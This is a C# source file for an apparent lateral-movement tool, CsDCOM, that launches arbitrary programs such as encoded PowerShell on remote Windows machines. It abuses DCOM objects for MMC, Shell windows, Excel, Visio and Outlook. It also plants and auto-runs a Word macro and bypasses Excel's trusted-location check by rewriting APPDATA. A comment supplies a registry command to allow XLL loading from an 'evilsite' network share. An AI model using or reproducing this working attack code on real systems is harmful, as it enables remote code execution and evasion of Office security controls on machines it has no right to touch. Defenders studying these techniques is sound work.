using System;
using System.IO;
using System.Reflection;
using NDesk.Options;

namespace CsDCOM
{
    internal static class Program
    {
        private enum Method
        {
            MMC20Application,
            ShellWindows,
            ShellBrowserWindow,
            ExcelDDE,
            VisioAddonEx,
            OutlookShellEx,
            ExcelXLL,
            VisioExecLine,
            OfficeMacro
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        private static void Main(string[] args)
        {
            var help = false;
            var target = string.Empty;
            var binary = string.Empty;
            var arg = string.Empty;
            var method = string.Empty;

            var options = new OptionSet
            {
                {"t|target=", "Target Machine", o => target = o},
                {"b|binary=", "Binary: powershell.exe", o => binary = o},
                {"a|args=", "Arguments: -enc <blah>", o => arg = o},
                {"m|method=", $"Methods: {string.Join(", ", Enum.GetNames(typeof(Method)))}", o => method = o},
                {"h|?|help", "Show Help", o => help = true}
            };

            try
            {
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(binary) || string.IsNullOrEmpty(method))
                {
                    ShowHelp(options);
                    return;
                }

                if ((binary.Contains("powershell") || binary.Contains("cmd")) && string.IsNullOrEmpty(arg))
                {
                    Console.WriteLine($" [x] PowerShell and CMD need arguments! {Environment.NewLine}");
                    ShowHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(Method), method))
                {
                    ShowHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

            try
            {
                Console.WriteLine($"[+] Executing {method}");
                typeof(Program).GetMethod(method).Invoke(null, new object[] { target, binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine($" [x] FAIL: Executing {method}");
                Console.WriteLine($" [x] Description: {e.Message}");
            }
        }

        public static void MMC20Application(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("MMC20.Application", target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
                view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view,
                    new object[] { binary, null, arg, "7" });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void ShellWindows(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
                var obj = Activator.CreateInstance(type);
                var item = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, null);
                var doc = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void ShellBrowserWindow(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void ExcelDDE(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
                obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj,
                    new object[] { binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void VisioAddonEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
                if (type == null)
                {
                    Console.WriteLine(" [x] Visio not installed");
                    return;
                }

                var obj = Activator.CreateInstance(type);
                var addons = obj.GetType().InvokeMember("Addons", BindingFlags.GetProperty, null, obj, null);
                var addon = addons.GetType()
                    .InvokeMember(@"Add", BindingFlags.InvokeMethod, null, addons, new object[] { binary });
                // Executing Addon
                addon.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, null, addon, new object[] { arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void VisioExecLine(string target, string binary, string arg)
        {
            var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
            try
            {
                var type = Type.GetTypeFromProgID("Visio.InvisibleApp", target);
                if (type == null)
                {
                    Console.WriteLine(" [x] Visio not installed");
                    return;
                }

                var obj = Activator.CreateInstance(type);

                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
                var doc = docs.GetType().InvokeMember(@"Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
                doc.GetType().InvokeMember(@"ExecuteLine", BindingFlags.InvokeMethod, null, doc, new object[] { code });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void OutlookShellEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Outlook.Application", target);
                var obj = Activator.CreateInstance(type);

                var shell = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                    new object[] { "Shell.Application" });
                shell.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, shell,
                    new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void OutlookScriptEx(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Outlook.Application", target);
                var obj = Activator.CreateInstance(type);

                try
                {
                    var scriptControl = obj.GetType().InvokeMember("CreateObject", BindingFlags.InvokeMethod, null, obj,
                        new object[] { "ScriptControl" });
                    scriptControl.GetType().InvokeMember("Language", BindingFlags.SetProperty, null, scriptControl,
                        new object[] { "VBScript" });
                    var code = $"CreateObject(\"Wscript.Shell\").Exec(\"{binary} {arg}\")";
                    scriptControl.GetType().InvokeMember("AddCode", BindingFlags.InvokeMethod, null, scriptControl,
                        new object[] { code });
                }
                catch
                {
                    Console.WriteLine(" [-] FATAL ERROR: Unable to load ScriptControl on a 64-bit Outlook");
                    Environment.Exit(1);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        /**
         * By default, this won't work if the AddIn is loaded from an untrusted location
         *
         * The default trusted directory for AddIns are:
         * - C:\Program Files\Microsoft Office\Root\Office16\XLSTART\
         * - C:\Program Files\Microsoft Office\Root\Office16\STARTUP\
         * - C:\Program Files\Microsoft Office\Root\Templates\
         * - %APPDATA%\Microsoft\Templates
         * - %APPDATA%\Microsoft\Excel\XLSTART
         *
         * To enable XLL loading from network locations (shares or other means). Loading via "\\evilsite\evilsmb\eviladdin.xll"
         * reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations" /v allownetworklocations /t REG_DWORD /d 1
         *
         */
        public static void ExcelXLL(string target, string binary, string args=null)
        {
            if (!File.Exists(binary))
            {
                Console.WriteLine(" [x] XLL not found");
                return;
            }

            string absPath = Path.GetFullPath(binary);
            string path = Path.GetDirectoryName(absPath);
            string fakePath = Path.Combine(path, "Microsoft\\Excel\\XLSTART");
            string filePath = binary;
            string fakeFilePath = Path.Combine(fakePath, Path.GetFileNameWithoutExtension(Path.GetRandomFileName()) + ".xll");

            if (target != Environment.MachineName)
            {
                Console.WriteLine(" [x] NOT IMPLEMENTED: This method cannot be used remotely");
                Environment.Exit(1);
            }
            AppData appData = AppData.CreateInstance();

            if (!Validator.IsValidXLLPath(path))
            {
                Console.WriteLine(" [x] WARNING: Loading XLL from untrusted location is disabled by default");
            }

            var macro = $"DIRECTORY(\"{path}\")";

            try
            {
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, obj,
                    new object[] { macro });

                if (!Validator.IsValidXLLPath(path))
                {
                    Console.WriteLine(" [-] WARNING: Trying to modify AppData to bypass untrusted location check");
                    Console.WriteLine($" [+] INFO: Old AppData {appData.GetCurrent()}");
                    appData.Change(path);
                    Console.WriteLine($" [+] INFO: New AppData {appData.GetCurrent()}");
                    Console.WriteLine($" [+] Generating Fake Path: {fakePath}");
                    if (!Directory.Exists(fakePath))
                    {
                        DirectoryInfo di = Directory.CreateDirectory(fakePath);
                    }
                    Console.WriteLine(" [+] Moving XLL file");
                    File.Copy(filePath, fakeFilePath);
                }

                Exception regXLLex = null;
                try
                {
                    obj.GetType().InvokeMember("RegisterXLL", BindingFlags.InvokeMethod, null, obj,
                        new object[] { fakeFilePath });
                    var exe = Activator.CreateInstance(type);
                }
                catch (Exception e)
                {
                    regXLLex = e;
                }
                // Restoring AppData
                if (appData.ChangeApplied())
                {
                    Console.WriteLine(" [+] Restoring AppData");
                    appData.Restore();
                }
                // Cleaning Up
                if (File.Exists(fakePath))
                {
                    File.Delete(fakePath);
                }

                // An exception was raised before, re-raising it
                if (regXLLex != null)
                {
                    Console.WriteLine($" [x] ERROR: RegisterXLL threw {regXLLex.Message}");
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        public static void OfficeMacro(string target, string binary, string arg)
        {
            Console.WriteLine($"[*] Setting up Word Office Macro");
            try
            {
                var type = Type.GetTypeFromProgID("Word.Application", target);
                var code = $"{binary} {arg}";
                var macro = $@"Sub Execute()
Dim wsh As Object
    Set wsh = CreateObject(""WScript.Shell"")
    wsh.Run ""{code}""
    Set wsh = Nothing
End Sub
Sub AutoOpen()
    Execute
End Sub
";
                var obj = Activator.CreateInstance(type);

                var docs = obj.GetType().InvokeMember("Documents", BindingFlags.GetProperty, null, obj, null);
                foreach (var m in docs.GetType().GetProperties())
                    if (m.Name == "Documents")
                    {
                        Console.WriteLine($" [+] Fetched: {m}");
                        docs = m.GetValue(docs);
                    }

                var doc = docs.GetType().InvokeMember("Add", BindingFlags.InvokeMethod, null, docs, new object[] { "" });
                // For some reason vbProject won't be initialized correctly with the following statement
                var vbProject = doc.GetType().InvokeMember("VBProject", BindingFlags.GetProperty, null, doc, null);
                Console.WriteLine(" [+] Setting up VBProject");

                foreach (var m in doc.GetType().GetProperties())
                    if (m.Name == "VBProject")
                    {
                        Console.WriteLine($" [+] Fetched: {m}");
                        vbProject = m.GetValue(doc);
                    }

                var vbComponents = vbProject.GetType()
                    .InvokeMember("VBComponents", BindingFlags.GetProperty, null, vbProject, null);
                var vbc = vbComponents.GetType()
                    .InvokeMember("Add", BindingFlags.InvokeMethod, null, vbComponents, new object[] { 1 });

                Console.WriteLine(" [+] Loading Macro");

                var codeModule = vbc.GetType().InvokeMember("CodeModule", BindingFlags.GetProperty, null, vbc, null);
                codeModule.GetType().InvokeMember("AddFromString", BindingFlags.InvokeMethod, null, codeModule,
                    new object[] { macro });
                // Run Macro
                doc.GetType().InvokeMember("RunAutoMacro", BindingFlags.InvokeMethod, null, doc, new object[] { 2 });
                // Shutdown Word
                obj.GetType().InvokeMember("Quit", BindingFlags.InvokeMethod, null, obj, null);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
       
    }
    internal class AppData
    {
        private string oldValue;
        private string newValue;
        private EnvironmentVariableTarget envTarget;

        public static AppData CreateInstance()
        {
            return new AppData();
        }

        private AppData()
        {
            this.envTarget = EnvironmentVariableTarget.User | EnvironmentVariableTarget.Process;
            this.oldValue = Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

        public void Change(string value)
        {
            try
            {
                this.newValue = value;
                Environment.SetEnvironmentVariable("APPDATA", value, this.envTarget);
            }
            catch
            {
            }
        }
        public void Restore()
        {
            this.Change(this.oldValue);
        }

        public bool ChangeApplied()
        {
            return this.newValue == Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

        public string GetCurrent()
        {
            return Environment.GetEnvironmentVariable("APPDATA", this.envTarget);
        }

    }

    internal static class Validator
    {
        public static bool IsValidXLLPath(string path)
        {
            bool response = false;
            string[] defaultTrustedLocation = new string[]
            {
                @"C:\Program Files\Microsoft Office\Root\Office16\XLSTART\",
                @"C:\Program Files\Microsoft Office\Root\Office16\STARTUP\",
                @"C:\Program Files\Microsoft Office\Root\Templates\",
                @"AppData\Roaming\Microsoft\Templates",
                @"AppData\Roaming\Microsoft\Excel\XLSTART"
            };
            foreach (string p in defaultTrustedLocation)
            {
                if (path.Contains(p))
                {
                    response = true;
                }
            }

            return response;
        }
    }
}